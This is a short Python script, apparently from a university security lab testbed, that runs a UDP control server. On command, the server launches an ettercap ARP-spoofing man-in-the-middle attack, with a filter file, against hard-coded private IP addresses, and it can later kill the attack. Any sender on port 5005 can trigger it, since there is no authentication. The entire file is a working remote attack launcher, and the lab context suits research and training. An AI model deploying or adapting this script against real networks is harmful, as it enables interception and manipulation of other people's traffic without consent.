#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        attackServ.py
#
# Purpose:     This module will create a attack service program
#               
# Author:      Yuancheng Liu
#
# Created:     2019/12/02
# Copyright:   NUS Singtel Cyber Security Research & Development Laboratory
# License:     YC @ NUS
#-----------------------------------------------------------------------------
import os
import sys
import signal
import socket
import subprocess



SEV_IP = ('0.0.0.0', 5005)
BUFFER_SZ = 1024

class attackServ(object):

    def __init__(self, parent):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.terminate = False
        self.recvMsg = None
        self.sock.bind(SEV_IP)
        self.simulation = False

    def startSev(self):
        print('Server started')
        while not self.terminate:
            data, address = self.sock.recvfrom(BUFFER_SZ)
            if not data: break
            if isinstance(data, bytes):
                msg = data.decode(encoding="utf-8")
                print('Received msg %s' %msg)
                self.parseMsg(msg, address)
                
    def parseMsg(self, msg, addr):
        """ parse the attack control message.
        """
        tag, val = msg.split(';')
        if tag == 'C':
            print('Client connected.')
            msg = 'C;1'
            self.sock.sendto(msg.encode('utf-8'), addr)
        elif tag == 'A':
            if val == '1':
                print('starting the attack.')
                atkStr = "sudo ettercap -T -q -F /home/pi/mitm/_1.ef -M ARP /172.18.212.120,123//"
                p = subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                print(p)
            else:
                print('Stop the attack.')
                for line in os.popen("ps ax | grep ettercap | grep -v grep"):
                    fields = line.split()
                    pid = fields[0]
                    os.kill(int(pid), signal.SIGKILL)

#-----------------------------------------------------------------------------
def serverRun():
    serv = attackServ(None)
    serv.startSev()
	

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    serverRun()
